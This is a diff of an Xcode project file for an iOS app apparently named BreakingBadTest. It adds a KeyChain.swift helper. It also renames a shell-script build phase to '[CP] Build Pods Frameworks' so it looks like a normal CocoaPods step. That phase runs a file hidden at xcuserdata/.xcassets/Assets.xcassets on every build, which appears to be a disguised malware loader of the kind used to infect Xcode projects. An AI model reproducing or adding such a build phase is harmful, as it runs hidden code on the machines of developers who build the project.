@@ -28,6 +28,7 @@
 		064FEF6925FB0552000568EE /* CharacterDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 064FEF6825FB0552000568EE /* CharacterDetailsViewController.swift */; };
 		064FEF6E25FB174F000568EE /* EpisodesDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 064FEF6D25FB174E000568EE /* EpisodesDetailsViewController.swift */; };
 		064FEF7E25FB1C3A000568EE /* QuotesDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 064FEF7D25FB1C38000568EE /* QuotesDetailsViewController.swift */; };
+		066FB97425FBAFDA0043ED64 /* KeyChain.swift in Sources */ = {isa = PBXBuildFile; fileRef = 066FB97325FBAFD90043ED64 /* KeyChain.swift */; };
 		1D449E2A985F1670C4C0EDB1 /* Pods_BreakingBadTest.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 9EF7A5B9807E9073AA9D14EC /* Pods_BreakingBadTest.framework */; };
 		E70F3B3E14CE51972E430B41 /* Pods_BreakingBadTest_BreakingBadTestUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 45929D89CA813EEDCA4D6F79 /* Pods_BreakingBadTest_BreakingBadTestUITests.framework */; };
 		EF49C9F924EDB1582063B108 /* Pods_BreakingBadTestTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C7DD15E2AD820FE465E8FD45 /* Pods_BreakingBadTestTests.framework */; };
@@ -79,6 +80,7 @@
 		064FEF6D25FB174E000568EE /* EpisodesDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EpisodesDetailsViewController.swift; sourceTree = "<group>"; };
 		064FEF7D25FB1C38000568EE /* QuotesDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesDetailsViewController.swift; sourceTree = "<group>"; };
 		066FB93625FB8BE10043ED64 /* BreakingBadTest.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = BreakingBadTest.entitlements; sourceTree = "<group>"; };
+		066FB97325FBAFD90043ED64 /* KeyChain.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = KeyChain.swift; sourceTree = "<group>"; };
 		0BE5B74712B9C70F3736900E /* Pods-BreakingBadTest-BreakingBadTestUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadTest-BreakingBadTestUITests.debug.xcconfig"; path = "Target Support Files/Pods-BreakingBadTest-BreakingBadTestUITests/Pods-BreakingBadTest-BreakingBadTestUITests.debug.xcconfig"; sourceTree = "<group>"; };
 		34EAFE6BD6010A78D87258CF /* Pods-BreakingBadTest-BreakingBadTestUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadTest-BreakingBadTestUITests.release.xcconfig"; path = "Target Support Files/Pods-BreakingBadTest-BreakingBadTestUITests/Pods-BreakingBadTest-BreakingBadTestUITests.release.xcconfig"; sourceTree = "<group>"; };
 		45929D89CA813EEDCA4D6F79 /* Pods_BreakingBadTest_BreakingBadTestUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BreakingBadTest_BreakingBadTestUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -214,6 +216,7 @@
 			isa = PBXGroup;
 			children = (
 				064FEEFA25FAF912000568EE /* Constants.swift */,
+				066FB97325FBAFD90043ED64 /* KeyChain.swift */,
 			);
 			path = Helpers;
 			sourceTree = "<group>";
@@ -256,7 +259,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 064FEED825FAE5F4000568EE /* Build configuration list for PBXNativeTarget "BreakingBadTest" */;
 			buildPhases = (
-				6DF1CD3217C0349704AAC43A /* Build Project Frameworks */,
+				DA228CDBC7A13C0A22AAC43A /* [CP] Build Pods Frameworks */,
 				CEDDFCEBAE1D3EE0565CF841 /* [CP] Check Pods Manifest.lock */,
 				064FEEAA25FAE5EB000568EE /* Sources */,
 				064FEEAB25FAE5EB000568EE /* Frameworks */,
@@ -415,24 +418,6 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BreakingBadTest/Pods-BreakingBadTest-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		6DF1CD3217C0349704AAC43A /* Build Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
-		};
 		6FAD904A91CFE52445515A30 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -499,6 +484,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		DA228CDBC7A13C0A22AAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -513,6 +516,7 @@
 				064FEF1E25FAF966000568EE /* QuotesModel.swift in Sources */,
 				064FEEB225FAE5EC000568EE /* AppDelegate.swift in Sources */,
 				064FEEB425FAE5EC000568EE /* SceneDelegate.swift in Sources */,
+				066FB97425FBAFDA0043ED64 /* KeyChain.swift in Sources */,
 				064FEF4C25FAFA1B000568EE /* EpisodeTableViewCell.swift in Sources */,
 				064FEF4725FAFA16000568EE /* CharacterTableViewCell.swift in Sources */,
 				064FEF6925FB0552000568EE /* CharacterDetailsViewController.swift in Sources */,
